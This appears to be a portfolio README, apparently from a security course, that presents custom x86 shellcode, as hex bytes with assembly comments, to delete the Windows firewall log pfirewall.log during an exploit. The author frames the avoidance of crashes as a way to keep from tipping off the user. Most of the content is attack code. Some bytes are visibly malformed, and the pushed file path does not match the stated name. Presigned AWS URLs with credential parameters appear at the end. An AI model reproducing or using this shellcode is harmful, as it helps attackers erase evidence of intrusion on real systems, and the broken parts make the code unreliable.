# Custom-Shellcode

<h2>Description</h2>
Project consists of a custom shellcode that would delete pfirewall.log.
<br />

<h2>Languages and Utilities Used</h2>

- <b>Putty (Linux)</b>
- <b>Immunity Debugger</b>
- <b>Mona</b>
- <b>Metasploit</b>


<h2>Environments Used </h2>

- <b>Amazon WorkSpace</b>

<h2>Custom Shellcode</h2>

Gregor, 

Here is the new code that will delete the Firewall log file. I created this custom shellcode that I put in place of the msfvenom one we used in the past.  See script below:

In order to ensure that it works, I created a pfirewall file to save in the C drive. From here, I pushed the pfirewall.log on the stack. I noticed null bytes, so I removed them by adding 0x11111111. I made sure that the code had the correct amount of parameters set then called the remove memory address. To finish the code off, I made sure there would be a clean exit that wouldn’t crash the server. I then ran the shellcode in a new script in a debugger while looking at the file I created. It deleted as soon as I ran the script. Key lesson was to use call instead of jmp because that would crash the server and tip the user. Also, pay attention to the null bytes.


 
#REMOVE NULLBYTES

"\x33\xc0"  xor eax eax

"\xc7\xc3\x5b\x5e\x56\xef MOV EBX, 0xEF565E5B

"\x81\xc3\x11\x11\x11\x11" ADD EBX, 0x11111111

"\x53"  PUSH EBX



#PUSH MY PFIREWALL.LOG ONTO THE STACK

"\x68\x6f\x67\x67\x00"    //PUSH 0x0020676f =log

"\x68\x61\x6c\x6c\x2e"    //PUSH 0x2e6c6c61 = .lla

"\x68\x69\x72\x65\x77"    //PUSH 0x77657269 = weri

"\x68\x6c\x5c\x70\x66"    //PUSH 0x66705c6c = fp\l

"\x68\x65\x77\x61\x6c"    //PUSH 0x6c617765 = lawe

"\x68\x5c\x46\x69\x72"    //PUSH 0x7269465c = riF\

"\x68\x69\x6c\x65\x73"    //PUSH 0x73656c69 = seli

"\x68\x4c\x6f\x67\x46"    //PUSH 0x46676f4c = FgoL

"\x68\x6d\x33\x32\x5c"    //PUSH 0x5c32336d = \23m

"\x68\x79\x73\x74\x65"    //PUSH 0x65747379 = etsy

"\x68\x77\x73\x5c\x53"    //PUSH 0x535c7377 = S\sw

"\x68\x69\x6e\x64\x6f"    //PUSH 0x6f646e69 = odni

"\x68\x43\x3a\x5c\x57"    //PUSH 0x575c3a43 = W\:C

"\x8b\xdc"               // mov ebx,esp



#SET STACK Parameters

"\x53"     push ebx



#CALL A FUNCTION TO DELETE THE FILE

"\x53" push ebx

"\xc7\xc6\xf0\x73\xdc\x73" mov esi, 0x73dc73f0

"\xff\xd6" call, esi remove() 



#EXIT CLEANLY FROM MY SHELLCODE

"\x33\xc0"   //xor eax,eax => eax is now 00000000

"\x50"       //push eax

"\xc7\xc0\xc0\xb3\x8a\x76" // mov eax,0x768ab3c0

"\xff\xe0"  //call eax = launch ExitProcess(0)



<p align="center">
Script<br/>
<img src=https://s3.amazonaws.com/gbstool/submissions2020/268796/pfirewall%20shellcode.PNG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20240301T150043Z&X-Amz-SignedHeaders=host&X-Amz-Expires=36900&X-Amz-Credential=AKIAJBIZLMJQ2O6DKIAA%2F20240301%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=fc9e654bcc1244e52fe8f92097832c6495be9b058d2290d285a2fb6b49ad3aeb
<br />

<p align="center">
Script<br/>
<img src=https://s3.amazonaws.com/gbstool/submissions2020/268796/pfirewall%20ropchain.PNG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20240301T150043Z&X-Amz-SignedHeaders=host&X-Amz-Expires=36900&X-Amz-Credential=AKIAJBIZLMJQ2O6DKIAA%2F20240301%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=549556d84214813148d905008c752f60627434119c4001e70cf35a95f1071445
<br />

<p align="center">
Script<br/>
<img src=https://s3.amazonaws.com/gbstool/submissions2020/268796/pfirewall%20endcode.PNG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20240301T150043Z&X-Amz-SignedHeaders=host&X-Amz-Expires=36900&X-Amz-Credential=AKIAJBIZLMJQ2O6DKIAA%2F20240301%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=1bf61ad5229df916ebc12da77f194304d1da96b0b0a867f8c8fc38c0bee20286
<br />
